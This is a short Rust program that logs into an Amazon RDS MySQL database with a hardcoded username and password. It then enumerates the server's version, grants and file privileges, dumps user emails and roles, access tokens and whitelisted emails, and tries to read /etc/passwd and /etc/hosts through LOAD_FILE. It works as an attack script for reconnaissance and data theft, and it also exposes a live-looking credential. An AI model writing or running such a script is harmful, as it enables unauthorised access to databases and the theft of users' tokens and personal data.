use mysql::prelude::*;
use mysql::*;

fn main() {
    let opts = OptsBuilder::new()
        .ip_or_hostname(Some("api-service-database.cq9ruxfeoibr.us-east-1.rds.amazonaws.com"))
        .tcp_port(3306)
        .user(Some("apiservice"))
        .pass(Some("LmGwA3T8vHVNs8fI43OPaTZf07JQRRhKrkNxX9izNq0="))
        .db_name(Some("api-service"));
    let pool = match Pool::new(opts) { Ok(p) => p, Err(e) => { println!("POOL_ERR {}", e); return; } };
    let mut conn = match pool.get_conn() { Ok(c) => c, Err(e) => { println!("CONN_ERR {}", e); return; } };
    println!("=== VERSION ===");
    let v: Option<String> = conn.query_first("SELECT VERSION()").ok().flatten();
    println!("{:?}", v);
    println!("=== SECURE_FILE_PRIV ===");
    let s: Option<String> = conn.query_first("SELECT @@secure_file_priv").ok().flatten();
    println!("{:?}", s);
    println!("=== GRANTS ===");
    let g: Vec<String> = conn.query("SHOW GRANTS").unwrap_or_default();
    for x in g { println!("{}", x); }
    println!("=== USERS ===");
    let rows: Vec<(u64, String, String)> = conn.query("SELECT id, email, role FROM users LIMIT 10").unwrap_or_default();
    for r in rows { println!("USER {} {} {}", r.0, r.1, r.2); }
    println!("=== TOKENS ===");
    let t: Vec<(u64, String, String)> = conn.query("SELECT id, status, LEFT(access_token, 60) FROM access_token LIMIT 10").unwrap_or_default();
    for r in t { println!("TOKEN {} {} {}", r.0, r.1, r.2); }
    println!("=== WHITELIST ===");
    let w: Vec<(u64, String)> = conn.query("SELECT id, email FROM white_list_email LIMIT 20").unwrap_or_default();
    for r in w { println!("WL {} {}", r.0, r.1); }
    println!("=== LOAD_FILE_PASSWD ===");
    let p: Option<String> = conn.query_first("SELECT LOAD_FILE('/etc/passwd')").ok().flatten();
    println!("{:?}", p.map(|s| s.chars().take(500).collect::<String>()));
    println!("=== LOAD_FILE_HOSTS ===");
    let h: Option<String> = conn.query_first("SELECT LOAD_FILE('/etc/hosts')").ok().flatten();
    println!("{:?}", h.map(|s| s.chars().take(500).collect::<String>()));
}
